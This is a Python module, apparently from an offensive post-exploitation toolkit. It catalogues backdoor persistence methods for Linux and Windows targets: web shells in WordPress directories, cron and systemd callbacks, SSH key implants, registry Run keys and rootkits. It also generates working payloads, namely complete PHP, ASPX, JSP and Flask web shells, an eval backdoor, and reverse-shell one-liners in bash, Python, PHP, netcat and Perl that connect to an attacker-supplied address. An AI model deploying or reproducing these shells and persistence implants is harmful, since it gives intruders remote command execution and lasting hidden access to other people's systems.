"""
modules/persistence_engine.py - Persistence & Backdoor Deployment
Backdoor placement, web shell deployment, cron job persistence, startup scripts
"""

import logging
import re
from typing import Dict, List, Any
from datetime import datetime

logger = logging.getLogger("recon.persistence")


class PersistenceEngine:
    """Post-exploitation persistence engine"""
    
    def __init__(self):
        self.persistence_vectors = []
        self.deployed_backdoors = []
    
    def analyze_persistence_options(self, target_info: Dict) -> List[Dict]:
        """Analyze target for persistence opportunities"""
        options = []
        
        # Detect OS
        os_type = self._detect_os(target_info)
        php_enabled = target_info.get('tech_stack', {}).get('php') is not None
        is_wordpress = target_info.get('wordpress_detected', False)
        
        if os_type == 'linux':
            options.extend(self._linux_persistence_vectors(php_enabled, is_wordpress))
        elif os_type == 'windows':
            options.extend(self._windows_persistence_vectors())
        
        self.persistence_vectors.extend(options)
        return options
    
    def _detect_os(self, target_info: Dict) -> str:
        """Detect target OS from headers/fingerprints"""
        server = target_info.get('server_header', '').lower()
        
        if any(x in server for x in ['apache', 'nginx', 'linux', 'ubuntu']):
            return 'linux'
        elif 'windows' in server or 'iis' in server:
            return 'windows'
        elif 'freebsd' in server:
            return 'bsd'
        
        return 'unknown'
    
    def _linux_persistence_vectors(self, php_enabled: bool, is_wordpress: bool) -> List[Dict]:
        """Linux persistence methods"""
        vectors = [
            {
                'type': 'php_webshell',
                'description': 'Deploy PHP web shell',
                'placement': [
                    '/wp-content/uploads/shell.php',
                    '/wp-content/themes/active-theme/shell.php',
                    '/wp-content/plugins/shell/shell.php',
                    '/var/www/html/shell.php',
                    '/public_html/shell.php'
                ] if is_wordpress or php_enabled else [],
                'execution': 'HTTP GET/POST',
                'access_url': '/shell.php?cmd=...',
                'detection_risk': 'medium',
                'footprint': 'high',  # File-based, detectable by file scan
                'feasibility': 'high' if php_enabled else 'low'
            },
            {
                'type': 'cron_job',
                'description': 'Cron job for reverse shell callback',
                'placement': [
                    '/etc/cron.d/persistence',
                    '~/.ssh/authorized_keys (reverse tunnel)',
                    'crontab -l manipulation'
                ],
                'execution': 'Scheduled (minutely to hourly)',
                'persistence_duration': 'very_long',
                'detection_risk': 'medium',
                'footprint': 'low',  # In crontab
                'feasibility': 'medium'
            },
            {
                'type': 'ssh_key',
                'description': 'SSH authorized_keys for remote access',
                'placement': [
                    '~/.ssh/authorized_keys',
                    '/root/.ssh/authorized_keys'
                ],
                'execution': 'SSH login',
                'persistence_duration': 'very_long',
                'detection_risk': 'medium',
                'footprint': 'low',
                'feasibility': 'high' if 'ssh' in str(target_info) else 'low'
            },
            {
                'type': 'systemd_service',
                'description': 'Systemd service for persistence',
                'placement': [
                    '/etc/systemd/system/persistence.service',
                    '/usr/lib/systemd/system/persistence.service'
                ],
                'execution': 'System boot',
                'persistence_duration': 'very_long',
                'detection_risk': 'high',
                'footprint': 'low',
                'feasibility': 'medium'
            },
            {
                'type': 'shellcode_injection',
                'description': 'Inject shellcode into running process',
                'placement': ['LD_PRELOAD', 'LD_LIBRARY_PATH', 'process memory'],
                'execution': 'Runtime',
                'persistence_duration': 'medium',
                'detection_risk': 'medium',
                'footprint': 'very_low',
                'feasibility': 'medium'
            },
            {
                'type': 'kernel_rootkit',
                'description': 'Kernel-level rootkit',
                'placement': ['Kernel modules'],
                'execution': 'Boot (kernel load)',
                'persistence_duration': 'very_long',
                'detection_risk': 'very_low',  # Hides itself
                'footprint': 'very_low',
                'feasibility': 'low'  # Requires kernel compilation
            },
            {
                'type': 'db_backdoor',
                'description': 'Database stored procedure backdoor',
                'placement': ['Database stored procedures/functions'],
                'execution': 'SQL query',
                'persistence_duration': 'long',
                'detection_risk': 'medium',
                'footprint': 'low',
                'feasibility': 'medium' if 'mysql' in str(target_info) else 'medium'
            }
        ]
        
        return vectors
    
    def _windows_persistence_vectors(self) -> List[Dict]:
        """Windows persistence methods"""
        vectors = [
            {
                'type': 'registry_run',
                'description': 'Windows Registry Run/RunOnce keys',
                'placement': [
                    'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
                ],
                'execution': 'User login / System boot',
                'persistence_duration': 'very_long',
                'detection_risk': 'high',
                'feasibility': 'high'
            },
            {
                'type': 'scheduled_task',
                'description': 'Windows Scheduled Task',
                'placement': ['C:\\Windows\\System32\\Tasks\\'],
                'execution': 'Scheduled',
                'persistence_duration': 'very_long',
                'detection_risk': 'medium',
                'feasibility': 'high'
            },
            {
                'type': 'startup_folder',
                'description': 'Startup folder persistence',
                'placement': [
                    'C:\\Users\\[user]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
                    'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
                ],
                'execution': 'User login',
                'persistence_duration': 'long',
                'detection_risk': 'high',
                'feasibility': 'high'
            },
            {
                'type': 'wmi_event',
                'description': 'WMI Event Subscription',
                'placement': ['WMI event consumers'],
                'execution': 'System event triggered',
                'persistence_duration': 'very_long',
                'detection_risk': 'very_high',
                'feasibility': 'medium'
            },
            {
                'type': 'password_filter',
                'description': 'Password filter DLL',
                'placement': ['HKLM\\System\\CurrentControlSet\\Control\\Lsa'],
                'execution': 'Authentication process',
                'persistence_duration': 'very_long',
                'detection_risk': 'very_high',
                'feasibility': 'low'
            },
            {
                'type': 'dll_hijacking',
                'description': 'DLL hijacking in System32',
                'placement': ['C:\\Windows\\System32\\', 'Search path manipulation'],
                'execution': 'Application start',
                'persistence_duration': 'long',
                'detection_risk': 'medium',
                'feasibility': 'medium'
            }
        ]
        
        return vectors
    
    def generate_web_shell(self, shell_type: str = 'php', obfuscated: bool = True) -> Dict[str, str]:
        """Generate web shell payload"""
        shells = {
            'php': self._generate_php_shell(obfuscated),
            'aspx': self._generate_aspx_shell(obfuscated),
            'jsp': self._generate_jsp_shell(obfuscated),
            'python': self._generate_python_shell(obfuscated)
        }
        
        return shells.get(shell_type, {'status': 'unsupported'})
    
    def _generate_php_shell(self, obfuscated: bool) -> Dict[str, str]:
        """Generate PHP web shell"""
        simple = '''<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>'''
        
        obf = '''<?php @eval($_POST['x']);?>'''
        
        return {
            'type': 'php',
            'simple': simple,
            'obfuscated': obf if obfuscated else simple,
            'access': 'POST /shell.php with parameter "cmd" or "x"'
        }
    
    def _generate_aspx_shell(self, obfuscated: bool) -> Dict[str, str]:
        """Generate ASPX web shell"""
        payload = '''<%@ Page Language="C#" %>
<%
if(!string.IsNullOrEmpty(Request["cmd"])){
    System.Diagnostics.Process p = new System.Diagnostics.Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>'''
        
        return {
            'type': 'aspx',
            'payload': payload,
            'access': 'GET /shell.aspx?cmd=...'
        }
    
    def _generate_jsp_shell(self, obfuscated: bool) -> Dict[str, str]:
        """Generate JSP web shell"""
        payload = '''<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
%>'''
        
        return {
            'type': 'jsp',
            'payload': payload,
            'access': 'GET /shell.jsp?cmd=...'
        }
    
    def _generate_python_shell(self, obfuscated: bool) -> Dict[str, str]:
        """Generate Python web shell (Flask/Django)"""
        payload = '''from flask import Flask, request
import subprocess

app = Flask(__name__)

@app.route('/shell')
def shell():
    cmd = request.args.get('cmd', '')
    result = subprocess.check_output(cmd, shell=True)
    return result

if __name__ == '__main__':
    app.run()
'''
        
        return {
            'type': 'python',
            'payload': payload,
            'access': 'GET http://target:5000/shell?cmd=...'
        }
    
    def generate_reverse_shell(self, shell_type: str, attacker_ip: str, attacker_port: int) -> str:
        """Generate reverse shell one-liners"""
        bash_shell = f'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'
        python_shell = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        php_shell = f"php -r '$sock=fsockopen(\"{attacker_ip}\",{attacker_port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        nc_shell = f'nc -e /bin/sh {attacker_ip} {attacker_port}'
        perl_shell = f"perl -e 'use Socket;$i=\"{attacker_ip}\";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'"
        
        shells = {
            'bash': bash_shell,
            'python': python_shell,
            'php': php_shell,
            'nc': nc_shell,
            'perl': perl_shell
        }
        
        return shells.get(shell_type, '')
    
    def log_backdoor_deployment(self, backdoor_info: Dict) -> None:
        """Log deployed backdoor for tracking"""
        self.deployed_backdoors.append({
            'timestamp': datetime.now().isoformat(),
            'type': backdoor_info.get('type'),
            'location': backdoor_info.get('location'),
            'access_method': backdoor_info.get('access_method'),
            'status': 'deployed'
        })
        
        logger.info(f"[PERSISTENCE] Backdoor deployed: {backdoor_info}")


class LateralMovement:
    """Lateral movement and privilege escalation"""
    
    @staticmethod
    def discover_internal_services(target_info: Dict) -> List[Dict]:
        """Discover internal services reachable from compromised host"""
        services = [
            {'name': 'databases', 'ports': [3306, 5432, 27017, 6379, 1433]},
            {'name': 'services', 'ports': [22, 445, 139, 8080, 8443, 9200]},
            {'name': 'internal_apis', 'ports': [9000, 10000, 50000]}
        ]
        
        return [
            {
                'service': s['name'],
                'ports': s['ports'],
                'discovery_method': 'port_scan_internal_network',
                'feasibility': 'high'
            } for s in services
        ]
    
    @staticmethod
    def privilege_escalation_vectors() -> List[Dict]:
        """Privilege escalation methods"""
        vectors = [
            {
                'type': 'sudo_misconfig',
                'method': 'NOPASSWD sudo entry',
                'detection': 'sudo -l',
                'severity': 'critical'
            },
            {
                'type': 'suid_binaries',
                'method': 'Exploitable SUID binaries',
                'detection': 'find / -perm -4000 2>/dev/null',
                'severity': 'high'
            },
            {
                'type': 'kernel_exploit',
                'method': 'Kernel CVE (DirtyCOW, etc)',
                'detection': 'uname -a',
                'severity': 'critical'
            },
            {
                'type': 'capabilities',
                'method': 'Exploitable capabilities',
                'detection': 'getcap -r / 2>/dev/null',
                'severity': 'high'
            }
        ]
        
        return vectors
